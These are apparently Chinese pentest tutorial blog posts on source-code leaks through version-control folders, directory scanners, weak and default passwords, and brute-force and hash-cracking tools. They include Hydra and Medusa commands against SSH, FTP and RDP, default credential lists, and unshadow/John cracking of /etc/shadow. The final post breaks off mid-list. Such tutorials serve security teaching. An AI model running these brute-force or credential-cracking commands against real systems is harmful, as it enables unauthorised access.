<h4 id="cvs源代码泄露"><a href="#cvs源代码泄露" class="headerlink" title=".cvs源代码泄露"></a>.cvs源代码泄露</h4><p>CSV是一个C/S系统，多个开发人员通过中心版本控制系统来记录文件版本，从而达到保证文件同步的目的。主要是针对CVS/Root以及CVS/Entries目录，直接就可以看到泄露的信息。</p>
<p>返回根信息：<code>http://www.example.com/CVS/Root</code></p>
<p>返回所有文件的结构：<code>http://www.example.com/CVS/Entries</code></p>
<p>漏洞利用工具：dvcs-ripper</p>
<p>项目地址：<a href="https://github.com/kost/dvcs-ripper.git">https://github.com/kost/dvcs-ripper.git</a></p>
<p>运行示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rip-cvs.pl -v -u http://www.example.com/CVS</span><br></pre></td></tr></table></figure>

<h4 id="svn源代码泄露"><a href="#svn源代码泄露" class="headerlink" title=".svn源代码泄露"></a>.svn源代码泄露</h4><p>SVN是一个开放源代码的版本控制系统。在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要地方源代码信息。网站管理员在发布代码时，没有使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露在外网环境，可以使用.svn/entries文件，获取到服务器源码。</p>
<p>漏洞利用工具：</p>
<p>Seay SVN漏洞利用工具</p>
<p><img src="https://i.loli.net/2021/10/05/4AOYiPwVRNh7DXK.png" alt="img"></p>
<p>SvnExploit</p>
<p>项目地址：<a href="https://github.com/admintony/svnExploit/">https://github.com/admintony/svnExploit/</a></p>
<p>扫描站点存在/.svn/entries目录</p>
<p><img src="https://i.loli.net/2021/10/05/9SQeYdZz1yFkTU6.png" alt="img"></p>
<p>成功恢复代码</p>
<p><img src="https://i.loli.net/2021/10/05/nIVpGW3CxfX9Z6t.png" alt="img"></p>
<h4 id="hg源代码泄露"><a href="#hg源代码泄露" class="headerlink" title=".hg源代码泄露"></a>.hg源代码泄露</h4><p>Mercurial是一种轻量级分布式版本控制系统，使用hg init的时候会生成.hg。</p>
<p>漏洞利用工具：dvcs-ripper</p>
<p>项目地址：<a href="https://github.com/kost/dvcs-ripper.git">https://github.com/kost/dvcs-ripper.git</a></p>
<p>运行示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rip-cvs.pl -v -u http://www.example.com/.hg/</span><br></pre></td></tr></table></figure>

<h3 id="DS-store文件泄露"><a href="#DS-store文件泄露" class="headerlink" title=".DS_store文件泄露"></a>.DS_store文件泄露</h3><p>.DS_store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。如果将.DS_store上传部署到服务器，可能造成文件目录结构泄露，特别是备份文件、源代码文件。</p>
<p>漏洞利用工具：ds_store_exp</p>
<p>项目地址：<a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a></p>
<p>运行示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ds_store_exp.py http://xxx.com/.DS_Store</span><br></pre></td></tr></table></figure>

<h3 id="网站备份文件泄露"><a href="#网站备份文件泄露" class="headerlink" title="网站备份文件泄露"></a>网站备份文件泄露</h3><p>管理员将网站源代码备份在Web目录下，攻击者通过猜解文件路径，下载备份文件，导致源代码泄露。 常见的备份文件后缀：<code>.rar</code>、<code>.zip</code>、<code>.7z</code>、<code>.tar.gz</code>、<code>.bak</code>、<code>.txt</code>、<code>.old</code>、<code>.temp</code></p>
<h3 id="SWP文件泄露"><a href="#SWP文件泄露" class="headerlink" title="SWP文件泄露"></a>SWP文件泄露</h3><p>swp即swap文件，在编辑文件时产生的临时文件，它是隐藏文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，文件名为.filename.swp。</p>
<h3 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h3><p>WEB-INF是Java的Web应用的安全目录，如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>
<p>WEB-INF主要包含以下文件或目录：</p>
<ul>
<li>WEB-INF/web.xml：Web应用程序配置文件，描述了servlet和其他的应用组件及命名规则</li>
<li>WEB-INF/database.properties：数据库配置文件</li>
<li>WEB-INF/classes/：一般用来存放Java类文件（.class）</li>
<li>WEB-INF/lib/：用来存放打包好的库（.jar）</li>
<li>WEB-INF/src/：用来存放源代码</li>
</ul>
<p>通过找到 web.xml 文件，推断 class 文件的路径，最后直接下载 class 文件，再通过反编译 class 文件，得到网站源码。</p>
<h2 id="敏感目录收集方式"><a href="#敏感目录收集方式" class="headerlink" title="敏感目录收集方式"></a>敏感目录收集方式</h2><h3 id="网页中寻找"><a href="#网页中寻找" class="headerlink" title="网页中寻找"></a>网页中寻找</h3><ul>
<li>在robots.txt中看能否发现敏感目录</li>
<li>F12源代码链接处</li>
<li>通过查看一些图片的属性路径，运气好会发现很多隐藏的目录 结合域名+目录，用御剑进行扫描，当然也可以手动输入一些常见的后台管理地址进行访问。</li>
</ul>
<h3 id="其他端口中寻找"><a href="#其他端口中寻找" class="headerlink" title="其他端口中寻找"></a>其他端口中寻找</h3><p>有时候网站的不同端口中有一些便是专门的后台管理地址。根据经验总结，很多网站8080、8081端口是网站的管理地址。</p>
<p>例如：<code>http://www.xxx.com:8080</code></p>
<h3 id="网站分目录下寻找"><a href="#网站分目录下寻找" class="headerlink" title="网站分目录下寻找"></a>网站分目录下寻找</h3><p>有的时候网站会把管理地址放在一个分目录下，有的时候一个网站比较大，后台管理页面也比较多，就要分目录的去找，</p>
<p>例如：<code>http://www.xxx.com/test/admin/manage.php</code></p>
<p>你可以通过一些方式获取到网站的目录，然后在这个目录下进行扫描。当一个网站你扫描根目录没有任何收获时，这个时候通过分析网站的目录结构，然后扫描域名+目录，就能找出它的后台管理地址。</p>
<h3 id="子域名下寻找"><a href="#子域名下寻找" class="headerlink" title="子域名下寻找"></a>子域名下寻找</h3><p>有的时候网站的管理地址会放在子域名下，所以主站什么都找不到的情况下，如果发现子域名，就通过这些方法去子域名下找一下吧。</p>
<p>例如：<code>http://admin.xxx.com/login</code></p>
<h3 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h3><p>Google Hacking 一般是做为黑客在入侵时的一个手段.在入侵过程中有时需要查找后台的登陆口就需要用到Google Hacking。有时猜解密码的时候谷歌也是提供查找管理员资料的有效平台。是一种社会工程学获取目标信息的手段。可以用于跟踪某对象在网络上的各种踪迹（如交友平台、微博等）。</p>
<p>有关谷歌语法的介绍可参考第一章的第一节：<a href="../undefined">1.开源情报与搜索引擎</a></p>
<h3 id="网站爬虫"><a href="#网站爬虫" class="headerlink" title="网站爬虫"></a>网站爬虫</h3><p>通过awvs，burpsuite的爬行功能，可以拓扑出网站的目录结构，有的时候运气好能在网页的目录结构中找到好东西，不过爬行一般会结合工具扫描，比如你构造域名+目录，然后扫描这个。</p>
<p>burp spider爬行</p>
<p><img src="https://i.loli.net/2021/10/05/tOydZi3zbE1SkhP.png" alt="img"></p>
<h3 id="扫描工具"><a href="#扫描工具" class="headerlink" title="扫描工具"></a>扫描工具</h3><h4 id="御剑后台扫描工具"><a href="#御剑后台扫描工具" class="headerlink" title="御剑后台扫描工具"></a>御剑后台扫描工具</h4><p>御剑是一款针对网站目录及后台管理地址进行扫描的工具。该工具的开发思路其实是非常简单的，而工具里目录或者后台管理地址等的扫描用例才是一个黑客多年经验的结晶。<img src="https://i.loli.net/2021/10/05/BLz8JpVHl4TZxbj.png" alt="img"></p>
<h4 id="DirBuster"><a href="#DirBuster" class="headerlink" title="DirBuster"></a>DirBuster</h4><p>DirBuster是OWASP（Open Web Application Security Project）开发的一款专门用于探测Web服务器目录及隐藏文件的，功能十分强大的工具。DirBuster最擅长目录的暴力猜解，因此，DirBuster一般都会发现一些目录浏览、目录遍历及目录穿越等漏洞，甚至还会发现一些后台管理地址等。</p>
<p><img src="https://i.loli.net/2021/10/05/LXGmHOM45t3Wsx8.png" alt="3b2fca51126d0f343b1cb86a1085d9a9.png"></p>
<h4 id="wwwscan"><a href="#wwwscan" class="headerlink" title="wwwscan"></a>wwwscan</h4><p>wwwscan是一款网站后台扫描工具，简单好用又强大。它有命令行和图形界面两种。</p>
<p><img src="https://i.loli.net/2021/10/05/nY3vAF5JiEqBMem.png" alt="e22f74eaee18b731c5453b0e79f8e294.png"></p>
<h4 id="dirb"><a href="#dirb" class="headerlink" title="dirb"></a>dirb</h4><p>Kali Linux内置工具</p>
<p>dirb是一个基于字典的web目录扫描工具,会用递归的方式来获取更多的目录,它还支持代理和http认证限制访问的网站。</p>
<p>运行示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://www.baidu.com</span><br></pre></td></tr></table></figure>

<h4 id="dirmap"><a href="#dirmap" class="headerlink" title="dirmap"></a>dirmap</h4><p>一个高级web目录扫描工具，功能将会强于DirBuster、Dirsearch、cansina、御剑</p>
<p>项目地址：<a href="https://github.com/H4ckForJob/dirmap">https://github.com/H4ckForJob/dirmap</a></p>
<p>运行示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 dirmap.py -i https://target.com -lcf</span><br></pre></td></tr></table></figure>

<h4 id="Cansina"><a href="#Cansina" class="headerlink" title="Cansina"></a>Cansina</h4><p>Cansina是用python写的一款探测网站的敏感目录和内容的安全测试工具</p>
<p>项目地址：<a href="https://github.com/deibit/cansina">https://github.com/deibit/cansina</a></p>
<p>运行示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 cansina.py -u http://baidu.com</span><br></pre></td></tr></table></figure>

<h4 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h4><p>dirsearch是一个python开发的目录扫描工具,目的是扫描网站的敏感文件和目录从而找到突破口。</p>
<p>项目地址：<a href="https://github.com/maurosoria/dirsearch/">https://github.com/maurosoria/dirsearch/</a></p>
<p>运行示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://www.baidu.com -e php,js --exclude-status 403,401</span><br></pre></td></tr></table></figure>

<h4 id="weakfilescan"><a href="#weakfilescan" class="headerlink" title="weakfilescan"></a>weakfilescan</h4><p>基于爬虫，动态收集扫描目标相关信息后进行二次整理形成字典规则，利用动态规则的多线程敏感信息泄露检测工具。</p>
<p>项目地址：<a href="https://github.com/ring04h/weakfilescan">https://github.com/ring04h/weakfilescan</a></p>
<p>运行示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python wyspider.py http://wuyun.org php</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Web安全</category>
        <category>扫描与枚举</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>针对网络协议的暴力破解</title>
    <url>/post/b675a117.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="弱口令与字典"><a href="#弱口令与字典" class="headerlink" title="弱口令与字典"></a>弱口令与字典</h2><h3 id="弱口令的定义"><a href="#弱口令的定义" class="headerlink" title="弱口令的定义"></a>弱口令的定义</h3><p>弱口令(weak password) 没有严格和准确的定义，通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。弱口令指的是仅包含简单数字和字母的口令，例如“123”、“abc”等，因为这样的口令很容易被别人破解，从而使用户的互联网账号受到他人控制，因此不推荐用户使用。</p>
<h3 id="弱口令产生原因"><a href="#弱口令产生原因" class="headerlink" title="弱口令产生原因"></a>弱口令产生原因</h3><p>这个应该是与个人习惯相关与意识相关，为了避免忘记密码，使用一个非常容易记住的密码，或者是直接采用系统的默认密码等。相关的安全意识不够，总认为不会有人会猜到我这个弱口令的，相关的安全意识不够，总认为不会有人会猜到我这个弱口令的。</p>
<h3 id="弱口令的危害"><a href="#弱口令的危害" class="headerlink" title="弱口令的危害"></a>弱口令的危害</h3><p>通过系统弱口令，可被黑客直接获得系统控制权限。</p>
<h3 id="弱口令解决办法"><a href="#弱口令解决办法" class="headerlink" title="弱口令解决办法"></a>弱口令解决办法</h3><p>强制对所有的管理系统账号密码强度必须达到一定的级别。不可在使用简单的admin、123456等弱密码了，修改密码为复杂密码并加密保存，建议密码包含大小写字母，数据和特殊符号，密码长度不低于八位，如果网站存在数据泄漏漏洞（如sql注入漏洞），务必修复漏洞。。</p>
<p>设置密码通常遵循以下原则：</p>
<p>（1）不使用空口令或系统缺省的口令，这些口令众所周之，为典型的弱口令。</p>
<p>（2）口令长度不小于8 个字符。</p>
<p>（3）口令不应该为连续的某个字符（例如：AAAAAAAA）或重复某些字符的组合（例如：tzf.tzf.）。</p>
<p>（4）口令应该为以下四类字符的组合，大写字母(A-Z)、小写字母(a-z)、数字(0-9)和特殊字符。每类字符至少包含一个。如果某类字符只包含一个，那么该字符不应为首字符或尾字符。</p>
<p>（5）口令中不应包含本人、父母、子女和配偶的姓名和出生日期、纪念日期、登录名、E-mail 地址等等与本人有关的信息，以及字典中的单词。</p>
<p>（6）口令不应该为用数字或符号代替某些字母的单词。</p>
<p>（7）口令应该易记且可以快速输入，防止他人从你身后很容易看到你的输入。</p>
<p>（8）至少90 天内更换一次口令，防止未被发现的入侵者继续使用该口令。</p>
<h3 id="弱口令分类"><a href="#弱口令分类" class="headerlink" title="弱口令分类"></a>弱口令分类</h3><h4 id="公共弱口令"><a href="#公共弱口令" class="headerlink" title="公共弱口令"></a>公共弱口令</h4><p>公共弱口令就是常见的密码，公共弱口令也就是根据大量的密码数据统计得出的出现频率较高弱口令，关于这方面的弱口令统计结果有很多。</p>
<p>下列举例了10个全球最常用的弱口令（由安全公司NordPass公布）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123456</span><br><span class="line">123456789</span><br><span class="line">picture1</span><br><span class="line">password</span><br><span class="line">12345678</span><br><span class="line">111111</span><br><span class="line">123123</span><br><span class="line">12345</span><br><span class="line">1234567890</span><br><span class="line">senha</span><br></pre></td></tr></table></figure>

<p>其中，位居其三的picture1和位居其十的senha（在葡萄牙语中是密码的意思）均是2020年新上榜的密码。</p>
<p>完整榜单：<a href="https://nordpass.com/most-common-passwords-list/">https://nordpass.com/most-common-passwords-list/</a></p>
<p>对于网站后台而言，一般为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">manager</span><br><span class="line">admin123</span><br><span class="line">admin888</span><br><span class="line">admin666</span><br></pre></td></tr></table></figure>

<p>具体来说，不同的后台类型拥有不同的弱密码：</p>
<ul>
<li>数据库（phpmyadmin）：账号：root，密码：root、root123、123456</li>
<li>tomcat：账号：admin、tomcat、manager，密码：admin、tomcat、admin123、123456、manager</li>
<li>jboss：账号：admin、jboss、manager，密码：admin、jboss、manager、123456</li>
<li>weblogic：账号：weblogic、admin、manager，密码：weblogic、admin、manager、123456</li>
</ul>
<h4 id="条件弱口令"><a href="#条件弱口令" class="headerlink" title="条件弱口令"></a>条件弱口令</h4><p>个人弱口令往往与这个人的个人信息（姓名，生日，手机号，特殊昵称，爱好，社交软件账号，常用username,邮箱…），关系成员（家庭成员，男女朋友…），所处环境（车牌号，公司信息比如公司名称，公司成立时间或地点，公司domain等…），还有特殊的指定字符（数字，单词…），在这里我也列举一些经常出现的组合：我们可以使用一些工具来生成弱口令字典。</p>
<h3 id="弱口令字典生成工具"><a href="#弱口令字典生成工具" class="headerlink" title="弱口令字典生成工具"></a>弱口令字典生成工具</h3><h4 id="Pydictor"><a href="#Pydictor" class="headerlink" title="Pydictor"></a>Pydictor</h4><p>pydictor 是一款轻量级字典生成工具，使用 python 语言开发，遵循 GPLv3 协议的开源命令行工具，主要用来帮助安全研究人员生成称心如意的暴力破解字典。</p>
<p>以功能强大、简洁实用、适用场景多、自定义程度强为开发目标。</p>
<p>项目地址：<a href="https://github.com/LandGrey/pydictor">https://github.com/LandGrey/pydictor</a></p>
<h4 id="cupper"><a href="#cupper" class="headerlink" title="cupper"></a>cupper</h4><p>基于国外的一款社工字典生成工具（cupp）进行改进。因为cupp多年不更新而且密码生成习惯和汉语还是有很大差异的，在渗透测试环节存在许多问题。因此最初为了be better than cupp，社工密码生成器命名为cupper。但是现在这款工具的目标不仅仅是be better than cupp，而是力求达到国内最好的社工密码猜解效果。</p>
<p>项目地址：<a href="https://github.com/Saferman/cupper">https://github.com/Saferman/cupper</a></p>
<h4 id="PassGAN"><a href="#PassGAN" class="headerlink" title="PassGAN"></a>PassGAN</h4><p>基于深度学习，来训练PassGAN模型来生成密码。是第一个利用生成对抗网络（GANs）来增强密码破译的新方法。</p>
<p>（虽然我也没用过，感觉很NB的样子）</p>
<p>项目地址：<a href="https://github.com/brannondorsey/PassGAN">https://github.com/brannondorsey/PassGAN</a></p>
<h4 id="Crunch"><a href="#Crunch" class="headerlink" title="Crunch"></a>Crunch</h4><p>Crunch是一种创建密码字典工具，按照指定的规则生成密码字典，可以灵活的制定自己的字典文件。使用Crunch工具生成的密码可以输出到屏幕，保存到文件、或另一个程序。由其在渗透测试需要爆破的时候，字典的编排等直接影响到我们的爆破速度，对整个渗透测试流程起着十分重要的作用。</p>
<p>Crunch为kali自带工具之一。</p>
<p>使用教程：<a href="https://www.freebuf.com/sectool/170817.html">https://www.freebuf.com/sectool/170817.html</a></p>
<h3 id="Kali-Linux自带的字典"><a href="#Kali-Linux自带的字典" class="headerlink" title="Kali Linux自带的字典"></a>Kali Linux自带的字典</h3><p>Kali默认自带了一些字典，在 /usr/share/wordlists 目录下</p>
<p><img src="https://i.loli.net/2021/10/05/DwTF1z3xgV6PU9X.png" alt="a628e9d255698b11b1e78e7ec24e0979.png"></p>
<h2 id="暴力破解网络协议工具"><a href="#暴力破解网络协议工具" class="headerlink" title="暴力破解网络协议工具"></a>暴力破解网络协议工具</h2><h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>Hydra是一款非常强大的暴力破解工具，它是由著名的黑客组织THC开发的一款开源暴力破解工具。Hydra是一个验证性质的工具，主要目的是：展示安全研究人员从远程获取一个系统认证权限。</p>
<p>目前该工具支持以下协议的爆破： AFP，Cisco AAA，Cisco身份验证，Cisco启用，CVS，Firebird，FTP，HTTP-FORM-GET，HTTP-FORM-POST，HTTP-GET，HTTP-HEAD，HTTP-PROXY，HTTPS-FORM- GET，HTTPS-FORM-POST，HTTPS-GET，HTTPS-HEAD，HTTP-Proxy，ICQ，IMAP，IRC，LDAP，MS-SQL，MYSQL，NCP，NNTP，Oracle Listener，Oracle SID，Oracle，PC-Anywhere， PCNFS，POP3，POSTGRES，RDP，Rexec，Rlogin，Rsh，SAP / R3，SIP，SMB，SMTP，SMTP枚举，SNMP，SOCKS5，SSH（v1和v2），Subversion，Teamspeak（TS2），Telnet，VMware-Auth ，VNC和XMPP。</p>
<p>对于 HTTP，POP3，IMAP和SMTP，支持几种登录机制，如普通和MD5摘要等。</p>
<p>由于Kali中自带Hydra，所以怎么安装就不讲了，下面直接讲如何用它。</p>
<h4 id="常见参数"><a href="#常见参数" class="headerlink" title="常见参数"></a>常见参数</h4><ul>
<li>-R：继续从上一次进度接着破解</li>
<li>-S：大写，采用SSL链接</li>
<li>-s &lt;PORT&gt;：小写，可通过这个参数指定非默认端口</li>
<li>-l &lt;LOGIN&gt;：指定破解的用户，对特定用户破解</li>
<li>-L &lt;FILE&gt;：指定用户名字典</li>
<li>-p &lt;PASS&gt;：小写，指定密码破解，少用，一般是采用密码字典</li>
<li>-P &lt;FILE&gt;：大写，指定密码字典</li>
<li>-e &lt;ns&gt;：可选选项，n：空密码试探，s：使用指定用户和密码试探</li>
<li>-C &lt;FILE&gt;：使用冒号分割格式，例如“登录名:密码”来代替 -L/-P 参数</li>
<li>-M &lt;FILE&gt;：指定目标列表文件一行一条</li>
<li>-o &lt;FILE&gt;：指定结果输出文件</li>
<li>-f ：在使用-M参数以后，找到第一对登录名或者密码的时候中止破解</li>
<li>-t &lt;TASKS&gt;：同时运行的线程数，默认为16</li>
<li>-w &lt;TIME&gt;：设置最大超时的时间，单位秒，默认是30s</li>
<li>-v / -V：显示详细过程</li>
<li>server：目标ip</li>
<li>service：指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http[s]-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等</li>
<li>OPT：可选项</li>
</ul>
<h4 id="破解SSH"><a href="#破解SSH" class="headerlink" title="破解SSH"></a>破解SSH</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -P passwd.txt -o ssh.txt -vV -t 5 192.168.11.93 ssh</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/05/yZYIcgOoWD5bfdQ.png" alt="8358c8a89b5d02c7670ea8ae718c13a4.png"></p>
<h4 id="破解FTP"><a href="#破解FTP" class="headerlink" title="破解FTP"></a>破解FTP</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -P passwd.txt -o ftp.txt -vV -t 8 192.168.11.93 ftp</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/05/PEl2azG9xBXYgmi.png" alt="a7b52aa8f605b834afe39b955495a3c9.png"></p>
<h4 id="破解3389远程登录"><a href="#破解3389远程登录" class="headerlink" title="破解3389远程登录"></a>破解3389远程登录</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hdra -L user.txt -P passwd.txt -vV -t 16 192.168.14.198 rdp</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/05/uKeEW4zFgTHDtAY.png" alt="ab8ecf65d9bab340efc97288dd255f8f.png"></p>
<h3 id="Medusa"><a href="#Medusa" class="headerlink" title="Medusa"></a>Medusa</h3><h4 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h4><p>medusa（美杜莎）是一个速度快，支持大规模并行，模块化，爆破登陆，可以同时对多个主机，用户或是密码执行强力测试，medusa和hydra一样，同样属于在线破解工具，不同的是，medusa的稳定性相较于hydra要好很多但是支持的模块相对于hydra少一些。</p>
<h4 id="常见参数-1"><a href="#常见参数-1" class="headerlink" title="常见参数"></a>常见参数</h4><ul>
<li>-h 目标主机名称或是IP地址</li>
<li>-H 包含目标主机名称或是IP地址文件</li>
<li>-u 测试用户名</li>
<li>-U 包含测试用户名文件</li>
<li>-p 测试用户名密码</li>
<li>-P 包含测试用户名密码文件</li>
<li>-C 组合条件文件</li>
<li>-O 日志信息文件</li>
<li>-e[n/s/ns] n代表空密码，s代表为密码于用户名相同</li>
<li>-M 模块执行mingc</li>
<li>-m 传递参数到模块</li>
<li>-d 显示所有模块名称</li>
<li>-n 使用非默认TCP端口</li>
<li>-s 启用ssl</li>
<li>-r 重试时间，默认3秒</li>
<li>-t 设定线程数量</li>
</ul>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><ul>
<li>破解ftp服务</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">medusa -u root -P comon.lst -h 192.168.200.243 -M ftp</span><br></pre></td></tr></table></figure>

<ul>
<li>破解ssh</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">medusa -u root -P comon.lst -h 192.168.200.244 -e ns -M ssh</span><br></pre></td></tr></table></figure>

<h3 id="Sparta"><a href="#Sparta" class="headerlink" title="Sparta"></a>Sparta</h3><h4 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h4><p>Sparta是一个Nmap、Nikto、Hydra等工具的集合，利用各个工具的优秀功能，完成信息收集、扫描和爆破等一体化的工具流。</p>
<p>Sparta主要包含以下功能：</p>
<p>端口扫描，程序自动调用nmap进行扫描，根据nmap的扫描结果，nikto自动加载结果，展开更精确的扫描。</p>
<p>针对扫描的结果，特定使用，如：使用dirbuster目录爆破，利用webslayer进行web指纹识别。</p>
<p>针对可爆力破解的端口，可调用hydra进行暴力破解。</p>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/secforce/sparta.git</span><br><span class="line"><span class="built_in">cd</span> sparta/ </span><br><span class="line">python3 sparta.py</span><br></pre></td></tr></table></figure>

<h2 id="破解加密明文"><a href="#破解加密明文" class="headerlink" title="破解加密明文"></a>破解加密明文</h2><h3 id="John-the-Ripper"><a href="#John-the-Ripper" class="headerlink" title="John the Ripper"></a>John the Ripper</h3><h4 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h4><p><strong>John the Ripper</strong>是一个快速的密码破解工具，用于在已知密文的情况下尝试破解出明文，支持目前大多数的加密算法，如DES、MD4、MD5等。它支持多种不同类型的系统架构，包括Unix、Linux、Windows、DOS模式、BeOS和OpenVMS，主要目的是破解不够牢固的Unix/Linux系统密码。除了在各种Unix系统上最常见的几种密码哈希类型之外，它还支持Windows LM散列，以及社区增强版本中的许多其他哈希和密码。它是一款开源软件。Kali中自带John。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">可执行文件位置：  /usr/sbin/john</span><br><span class="line">密码字典所在目录：/usr/share/john/</span><br></pre></td></tr></table></figure>

<p>John the Ripper支持字典破解方式和暴力破解方式</p>
<h4 id="破解Linux系统密码"><a href="#破解Linux系统密码" class="headerlink" title="破解Linux系统密码"></a>破解Linux系统密码</h4><p>破解Linux用户密码需要使用到两个文件（包含用户的信息和密码hash值）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/passwd       包含用户信息的文件</span><br><span class="line">/etc/shadow       包含密码信息的文件</span><br></pre></td></tr></table></figure>

<p>创建一个 abc 用户，密码设置为 password ，用来测试</p>
<p><img src="https://i.loli.net/2021/10/05/dXw3oM2gVsRShIT.png" alt="img"></p>
<p>使用 unshadow 命令组合 /etc/passwd 和 /etc/shadow ，组合成 test_passwd 文件。其他 test_passwd 就是 /etc/passwd 和 /etc/shadow 的简单组合:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">unshadow  /etc/passwd  /etc/shadow &gt;  test_passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/05/1ZMmCKRvUqYdVjJ.png" alt="img"></p>
<p>然后用 John 破解密码了。我们可以使用 John 自带的密码字典，位于 /usr/share/john/password.lst ，也可以使用我们自己的密码字典。用John自带的密码字典为例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john  test_passwd</span><br></pre></td></tr></table></figure>

<p>若使用自己的密码字典：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john  --wordlist=字典路径    test_passw</span><br></pre></td></tr></table></figure>

<p>如图，john 已经把abc用户的密码给破解出来了</p>
<p><img src="https://i.loli.net/2021/10/05/xhUjei9ICamtuLo.png" alt="img"></p>
<p>查看破解信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john  --show  test_passwd</span><br></pre></td></tr></table></figure>

<p>这里root和yjx的密码是之前破解的，则一共破解了3个用户的密码</p>
<p><img src="https://i.loli.net/2021/10/05/BUSb52aKhixM1Vq.png" alt="img"></p>
<h3 id="在线MD5破解网站"><a href="#在线MD5破解网站" class="headerlink" title="在线MD5破解网站"></a>在线MD5破解网站</h3><ul>
<li>CMD5：<a href="https://www.cmd5.com/">https://www.cmd5.com/</a></li>
<li>SOMD5：<a href="https://www.somd5.com/">https://www.somd5.com/</a></li>
<li>查MD5啦：<a href="https://cmd5.la/">https://cmd5.la/</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>扫描与枚举</category>
      </categories>
      <tags>
        <tag>暴力破解</tag>
      </tags>
  </entry>
  <entry>
    <title>针对Web应用的暴力破解</title>
    <url>/post/6d47f502.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="表单暴力破解"><a href="#表单暴力破解" class="headerlink" title="表单暴力破解"></a>表单暴力破解</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。</p>
<p>理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括：</p>
<ol>
<li>是否要求用户设置复杂的密码；</li>
<li>是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；</li>
<li>是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；</li>
<li>是否采用了双因素认证；</li>
</ol>
<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ul>
<li>确认登录接口的脆弱性<ul>
<li>尝试登录——抓包——观察验证元素和response信息，判断是否存在暴力破解的可能</li>
